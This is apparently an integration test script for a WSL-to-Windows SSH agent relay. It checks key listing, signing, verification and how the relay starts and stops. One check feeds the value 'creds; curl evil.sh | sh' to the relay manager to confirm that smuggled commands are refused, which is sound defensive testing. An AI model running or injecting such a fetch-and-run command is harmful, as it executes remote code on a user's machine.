// Integration test: the SSH agent, reached from INSIDE WSL, through the real `creds relay`.
//
//   npm run compile && node scripts/wsl-agent-relay-itest.cjs
//
// What it proves that no unit test can: that a real `ssh-add -l` and a real `ssh-keygen -Y sign`
// running in a Linux kernel reach an agent that lives in a Windows process, and that the
// signature is one `-Y verify` accepts — which is the exact mechanism `git commit -S` uses with
// `gpg.format ssh`. Asserting that the relay forwarded bytes would prove nothing about whether
// the agent answered; that distinction is what made bridge phase 4a a defect rather than a
// feature (see `src/sshProgram.ts`).
//
// The private key exists only in this test's own Node process on the Windows side. It is never
// written anywhere, and never crosses into WSL.
//
// Skipped loudly, never silently: no Windows, no WSL, or no .NET SDK inside the distribution and
// the reason is printed with the command that would fix it.
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFile } = require('child_process');

const OUT = path.join(__dirname, '..', 'out');
const REPO = path.join(__dirname, '..', '..');
const WINDOWS_CLI = path.join(REPO, 'src_cli', 'src', 'bin', 'Debug', 'net10.0', 'creds.exe');
const LINUX_BUILD = '/tmp/creds-relay-itest-build';
const LINUX_CLI = `${LINUX_BUILD}/src_cli/src/bin/Debug/net10.0/creds`;
const PIPE_NAME = `creds-relay-itest-${process.pid}`;
// Not String.raw: a raw template cannot END in a backslash — it escapes the closing backtick and
// swallows the next line, which is a syntax error two lines further down.
const PIPE_ADDRESS = '\\\\.\\pipe\\' + PIPE_NAME;
const RELAY_SOCKET = `/tmp/creds-relay-itest-${process.pid}.sock`;

let failures = 0;
function check(name, ok, detail) {
  console.log(`${ok ? 'ok  ' : 'FAIL'} ${name}${ok || detail === undefined ? '' : ` — ${detail}`}`);
  if (!ok) {
    failures += 1;
  }
}

function skip(reason, fix) {
  console.log(`SKIP — ${reason}`);
  if (fix !== undefined) {
    console.log(`      ${fix}`);
  }
  process.exit(0);
}

function run(exe, args, options = {}) {
  return new Promise((resolve) => {
    execFile(exe, args, { timeout: 240_000, ...options }, (error, stdout, stderr) => {
      resolve({ code: error ? (error.code ?? 1) : 0, stdout: String(stdout), stderr: String(stderr) });
    });
  });
}

/** One command inside the default distribution, as a login shell so PATH is a person's PATH. */
const wsl = (script) => run('wsl.exe', ['-e', 'bash', '-lc', script]);

/**
 * The environment every WSL step needs.
 *
 * <p>`WSLENV` is not decoration. Environment variables do NOT cross from WSL into a Windows child
 * — measured 2026-08-26, including from .NET's own `ProcessStartInfo.Environment` — so without
 * naming it here the Windows half would read the real VS Code endpoint directory instead of this
 * test's. `/p` asks WSL to translate the path on the way through.</p>
 */
function wslEnv(endpointDir) {
  const linuxEndpointDir = endpointDir.replace(/^([A-Za-z]):/, (_, d) => `/mnt/${d.toLowerCase()}`).replace(/\\/g, '/');
  return [
    `export CREDS_ENDPOINT_DIR='${linuxEndpointDir}'`,
    'export WSLENV=CREDS_ENDPOINT_DIR/p',
    `export CREDS_WINDOWS_BINARY='${WINDOWS_CLI.replace(/^([A-Za-z]):/, (_, d) => `/mnt/${d.toLowerCase()}`).replace(/\\/g, '/')}'`,
    `export CREDS_RELAY_SOCKET='${RELAY_SOCKET}'`,
    `export SSH_AUTH_SOCK='${RELAY_SOCKET}'`,
  ].join('; ');
}

/** Build the Linux binary from a clean copy: the repo's own obj/ is a Windows build's. */
async function buildLinuxCli() {
  const built = await wsl(`test -x ${LINUX_CLI} && echo yes`);
  if (built.stdout.includes('yes')) {
    return true;
  }
  console.log('      building the Linux CLI inside WSL (once)…');
  const repoLinux = REPO.replace(/^([A-Za-z]):/, (_, d) => `/mnt/${d.toLowerCase()}`).replace(/\\/g, '/');
  const build = await wsl(
    `rm -rf ${LINUX_BUILD} && mkdir -p ${LINUX_BUILD}/src_cli/src ${LINUX_BUILD}/contract && ` +
      `cp ${repoLinux}/src_cli/src/*.cs ${repoLinux}/src_cli/src/*.csproj ${LINUX_BUILD}/src_cli/src/ && ` +
      `cp ${repoLinux}/contract/broker-v1.json ${LINUX_BUILD}/contract/ && ` +
      `cp ${repoLinux}/Directory.Build.props ${LINUX_BUILD}/ && ` +
      // No AOT: the distribution has the SDK but not a native linker, and the code under test is
      // the same either way — only the packaging differs.
      `cd ${LINUX_BUILD}/src_cli/src && dotnet build -c Debug -p:PublishAot=false 2>&1 | tail -3`,
  );
  const ok = await wsl(`test -x ${LINUX_CLI} && echo yes`);
  if (!ok.stdout.includes('yes')) {
    console.log(build.stdout.trim());
  }
  return ok.stdout.includes('yes');
}

async function main() {
  if (process.platform !== 'win32') {
    skip('this bridge only exists on Windows — elsewhere ssh reaches the agent directly');
  }
  const distro = await run('wsl.exe', ['-l', '-q']);
  if (distro.code !== 0) {
    skip('no WSL on this machine');
  }
  if (!fs.existsSync(WINDOWS_CLI)) {
    skip('the Windows CLI is not built', 'run: dotnet build src_cli/src/CredsCli.csproj');
  }
  const sdk = await wsl('command -v dotnet >/dev/null && echo yes');
  if (!sdk.stdout.includes('yes')) {
    skip('no .NET SDK inside WSL', 'install it in the distribution, then re-run');
  }
  if (!(await buildLinuxCli())) {
    skip('the Linux CLI could not be built inside WSL');
  }

  // ---- the agent, real, with a key generated here ----------------------------
  const { SshAgentServer } = require(path.join(OUT, 'sshAgentServer.js'));
  const { parseSshPrivateKey } = require(path.join(OUT, 'sshKeyParse.js'));
  const { signForAgent } = require(path.join(OUT, 'sshAgentSign.js'));

  const pem = crypto.generateKeyPairSync('ed25519', {
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    publicKeyEncoding: { type: 'spki', format: 'pem' },
  }).privateKey.toString();
  const parsed = parseSshPrivateKey(pem, 'wsl relay itest');
  check('the generated key parses', parsed.ok === true, parsed.ok ? '' : parsed.reason);
  if (!parsed.ok) {
    process.exit(1);
  }

  let asked = 0;
  const server = new SshAgentServer({
    socketPath: PIPE_ADDRESS,
    keys: () => [
      {
        entityId: 'e-wsl-itest',
        name: 'wsl relay itest',
        fingerprint: parsed.key.fingerprint,
        identity: { publicBlob: parsed.key.publicBlob, comment: 'wsl relay itest' },
        sign: (data, flags) => signForAgent(parsed.key, data, flags),
      },
    ],
    confirm: () => {
      asked += 1;
      return Promise.resolve(true);
    },
    log: () => undefined,
  });
  await server.listen();
  check('the agent is listening on a named pipe', server.listening === true);

  // ---- the announcement the relay discovers it through ------------------------
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'creds-relay-itest-'));
  const endpointDir = path.join(dir, 'endpoints');
  fs.mkdirSync(endpointDir);
  fs.writeFileSync(
    path.join(endpointDir, 'window-4242.json'),
    JSON.stringify({ pid: 4242, port: 1, startedAt: new Date().toISOString(), agentSocket: PIPE_ADDRESS }),
  );

  const env = wslEnv(endpointDir);
  await wsl(`rm -f ${RELAY_SOCKET}`);
  // setsid, because a relay started from a transient shell dies with it — measured, and it is
  // the failure a person meets first if they background it casually.
  await wsl(`${env}; nohup setsid ${LINUX_CLI} relay > /tmp/creds-relay-itest.log 2>&1 < /dev/null & sleep 3`);

  const mode = await wsl(`stat -c '%a' ${RELAY_SOCKET} 2>/dev/null`);
  check('the relay opened a socket only its owner can reach', mode.stdout.trim() === '600', mode.stdout.trim());

  // ---- what the whole thing is for -------------------------------------------
  const listed = await wsl(`${env}; ssh-add -l`);
  check(
    'ssh-add INSIDE WSL lists a key that lives in a Windows process',
    listed.stdout.includes(parsed.key.fingerprint),
    `${listed.stdout.trim()}${listed.stderr.trim()}`,
  );
  check('listing raised no dialog', asked === 0, `asked ${asked}`);

  const signed = await wsl(
    `${env}; ssh-add -L > /tmp/creds-itest.pub && echo payload > /tmp/creds-itest.txt && ` +
      'ssh-keygen -Y sign -f /tmp/creds-itest.pub -n file /tmp/creds-itest.txt 2>&1 | tail -1',
  );
  check(
    'ssh-keygen -Y sign produced a signature through the relay',
    signed.stdout.includes('Write signature'),
    `${signed.stdout.trim()}${signed.stderr.trim()}`,
  );
  check('signing asked the human exactly once', asked === 1, `asked ${asked}`);

  const verified = await wsl(
    `${env}; printf '%s %s\\n' itest "$(cut -d' ' -f1,2 /tmp/creds-itest.pub)" > /tmp/creds-itest.allowed && ` +
      'ssh-keygen -Y verify -f /tmp/creds-itest.allowed -I itest -n file -s /tmp/creds-itest.txt.sig ' +
      '< /tmp/creds-itest.txt 2>&1 | tail -1',
  );
  check(
    'ssh-keygen -Y verify accepts it — the mechanism git commit -S uses',
    verified.stdout.includes('Good "file" signature'),
    `${verified.stdout.trim()}${verified.stderr.trim()}`,
  );

  // ---- the design decision this exists to justify -----------------------------
  //
  // The Windows half resolves the agent's address on EVERY connection rather than once when the
  // relay starts. The agent runs only while a key is loaded, so a person who unloads a key and
  // loads another gets a different pipe — and a relay holding a startup snapshot would serve a
  // name whose server is gone, which on Windows is indistinguishable from one that never was.
  // Nothing below restarts the relay.
  server.dispose();
  const whileDown = await wsl(`${env}; ssh-add -l 2>&1 | tail -1`);
  check(
    'with the agent unloaded the relay reports it rather than hanging',
    !whileDown.stdout.includes(parsed.key.fingerprint),
    whileDown.stdout.trim(),
  );

  const secondPipe = `${PIPE_ADDRESS}-again`;
  const restarted = new SshAgentServer({
    socketPath: secondPipe,
    keys: () => [
      {
        entityId: 'e-wsl-itest',
        name: 'wsl relay itest',
        fingerprint: parsed.key.fingerprint,
        identity: { publicBlob: parsed.key.publicBlob, comment: 'wsl relay itest' },
        sign: (data, flags) => signForAgent(parsed.key, data, flags),
      },
    ],
    confirm: () => Promise.resolve(true),
    log: () => undefined,
  });
  await restarted.listen();
  fs.writeFileSync(
    path.join(endpointDir, 'window-4242.json'),
    JSON.stringify({ pid: 4242, port: 1, startedAt: new Date().toISOString(), agentSocket: secondPipe }),
  );
  const afterRestart = await wsl(`${env}; ssh-add -l 2>&1 | tail -1`);
  check(
    'a key loaded again is found by the SAME relay, at a new address',
    afterRestart.stdout.includes(parsed.key.fingerprint),
    afterRestart.stdout.trim(),
  );
  restarted.dispose();

  // ---- the lifecycle rules ----------------------------------------------------
  const second = await wsl(`${env}; ${LINUX_CLI} relay 2>&1 | tail -1`);
  check(
    'a second relay refuses a socket someone is already serving',
    second.stdout.includes('already served by a live relay'),
    second.stdout.trim(),
  );

  await wsl(`pkill -f '${LINUX_CLI} relay'; sleep 1`);
  const afterStop = await wsl(`${env}; ssh-add -l 2>&1 | tail -1`);
  check(
    'with the relay gone the socket answers nothing',
    !afterStop.stdout.includes(parsed.key.fingerprint),
    afterStop.stdout.trim(),
  );

  // ---- the extension's half: it raises and lowers the relay for you ------------
  //
  // Everything above proves the relay reaches the agent. This proves the thing that starts it —
  // the manager the extension runs when a key is loaded — actually spawns a real `wsl.exe`,
  // learns the socket from the relay's own first line rather than from a second copy of the
  // path rule, and takes it down again. A fake spawner cannot show any of that.
  const { WslRelayManager, spawnWslRelay } = require(path.join(OUT, 'wslRelayManager.js'));
  const MANAGED_SOCKET = `/tmp/creds-managed-${process.pid}.sock`;
  // Only this one variable needs to cross, and it is already a Linux path — so no `/p`.
  process.env.CREDS_RELAY_SOCKET = MANAGED_SOCKET;
  process.env.WSLENV = 'CREDS_RELAY_SOCKET';
  await wsl(`rm -f ${MANAGED_SOCKET}`);

  const managerLog = [];
  const manager = new WslRelayManager(
    (args) => spawnWslRelay(args, (text) => managerLog.push(text)),
    (message) => managerLog.push(message),
  );
  const startResult = manager.start(LINUX_CLI, '');
  check('the manager accepts a plain command', startResult.ok === true, JSON.stringify(startResult));

  for (let attempt = 0; attempt < 40 && manager.socketPath.length === 0; attempt += 1) {
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  check(
    'the manager learned the socket from the relay, not from a rule of its own',
    manager.socketPath === MANAGED_SOCKET,
    `${JSON.stringify(manager.socketPath)} — log: ${JSON.stringify(managerLog)}`,
  );
  const alive = await wsl(`ps -eo args | grep "[c]reds relay" | head -1`);
  check('a real relay is running in the distribution', alive.stdout.trim().length > 0, alive.stdout.trim());

  manager.dispose();
  await new Promise((resolve) => setTimeout(resolve, 2000));
  const gone = await wsl(`ps -eo args | grep "[c]reds relay" | head -1`);
  check('disposing the manager takes it down — nothing outlives the window', gone.stdout.trim().length === 0, gone.stdout.trim());

  const refused = manager.start('creds; curl evil.sh | sh', '');
  check('a command that is not a plain word never reaches a shell', refused.ok === false, JSON.stringify(refused));

  await wsl(`rm -f ${RELAY_SOCKET} ${MANAGED_SOCKET} /tmp/creds-itest.*`);
  fs.rmSync(dir, { recursive: true, force: true });

  console.log(failures === 0 ? '\nall WSL relay checks passed' : `\n${failures} check(s) failed`);
  process.exit(failures === 0 ? 0 : 1);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
